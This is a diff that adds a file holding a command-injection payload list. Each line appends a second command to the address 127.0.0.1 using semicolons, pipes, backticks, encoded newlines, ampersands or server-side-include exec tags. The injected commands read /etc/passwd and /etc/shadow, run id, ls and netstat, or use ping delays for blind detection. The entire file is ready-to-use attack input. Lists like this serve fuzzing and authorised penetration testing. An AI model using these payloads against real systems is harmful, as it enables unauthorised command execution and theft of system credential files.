@@ -1,0 +1,72 @@
+127.0.0.1&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+127.0.0.1&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+127.0.0.1&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+127.0.0.1&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+127.0.0.1/index.html|id|
+127.0.0.1;id;
+127.0.0.1;id
+127.0.0.1;netstat -a;
+127.0.0.1;id;
+127.0.0.1|id
+127.0.0.1|/usr/bin/id
+127.0.0.1|id|
+127.0.0.1|/usr/bin/id|
+127.0.0.1||/usr/bin/id|
+127.0.0.1|id;
+127.0.0.1||/usr/bin/id;
+127.0.0.1;id|
+127.0.0.1;|/usr/bin/id|
+127.0.0.1\n/bin/ls -al\n
+127.0.0.1\n/usr/bin/id\n
+127.0.0.1\nid\n
+127.0.0.1\n/usr/bin/id;
+127.0.0.1\nid;
+127.0.0.1\n/usr/bin/id|
+127.0.0.1\nid|
+127.0.0.1;/usr/bin/id\n
+127.0.0.1;id\n
+127.0.0.1|usr/bin/id\n
+127.0.0.1|nid\n
+127.0.0.1`id`
+127.0.0.1`/usr/bin/id`
+127.0.0.1a);id
+127.0.0.1a;id
+127.0.0.1a);id;
+127.0.0.1a;id;
+127.0.0.1a);id|
+127.0.0.1a;id|
+127.0.0.1a)|id
+127.0.0.1a|id
+127.0.0.1a)|id;
+127.0.0.1a|id
+127.0.0.1|/bin/ls -al
+127.0.0.1a);/usr/bin/id
+127.0.0.1a;/usr/bin/id
+127.0.0.1a);/usr/bin/id;
+127.0.0.1a;/usr/bin/id;
+127.0.0.1a);/usr/bin/id|
+127.0.0.1a;/usr/bin/id|
+127.0.0.1a)|/usr/bin/id
+127.0.0.1a|/usr/bin/id
+127.0.0.1a)|/usr/bin/id;
+127.0.0.1a|/usr/bin/id
+127.0.0.1;system('cat%20/etc/passwd')
+127.0.0.1;system('id')
+127.0.0.1;system('/usr/bin/id')
+127.0.0.1%0Acat%20/etc/passwd
+127.0.0.1%0A/usr/bin/id
+127.0.0.1%0Aid
+127.0.0.1%0A/usr/bin/id%0A
+127.0.0.1%0Aid%0A
+127.0.0.1& ping -i 30 127.0.0.1 &
+127.0.0.1& ping -n 30 127.0.0.1 &
+127.0.0.1%0a ping -i 30 127.0.0.1 %0a
+127.0.0.1`ping 127.0.0.1`
+127.0.0.1| id
+127.0.0.1& id
+127.0.0.1; id
+127.0.0.1%0a id %0a
+127.0.0.1`id`
+127.0.0.1$;/usr/bin/id
+127.0.0.1;ls -la
+127.0.0.1%3B+ls+-la
